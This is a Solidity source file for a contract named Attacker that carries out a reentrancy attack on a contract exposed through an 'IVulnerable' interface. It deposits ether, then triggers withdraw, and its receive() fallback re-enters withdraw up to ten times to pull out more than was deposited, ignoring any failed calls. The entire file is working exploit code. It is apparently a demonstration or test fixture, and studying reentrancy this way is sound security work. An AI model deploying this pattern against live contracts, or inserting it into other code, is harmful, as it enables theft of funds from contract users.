// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./IVulnerable.sol";

contract Attacker {
    IVulnerable public vulnerableContract;
    uint256 public numCalls;
    uint256 public maxCalls = 10;

    constructor(address _vulnerableContractAddress) public {
        vulnerableContract = IVulnerable(_vulnerableContractAddress);
    }

    function fund() public payable {
        vulnerableContract.deposit.value(msg.value)();
    }

    function attack() public {
        numCalls = 0;
        vulnerableContract.withdraw(1 ether);
    }

    receive() external payable {
        if (numCalls < maxCalls) {
            numCalls++;
            // Try to call withdraw and catch any errors
            (bool success, ) = address(vulnerableContract).call(
                abi.encodeWithSignature("withdraw(uint256)", 1 ether)
            );
            if (!success) {
                // Reentrant call failed, do nothing
            }
        }
    }
}
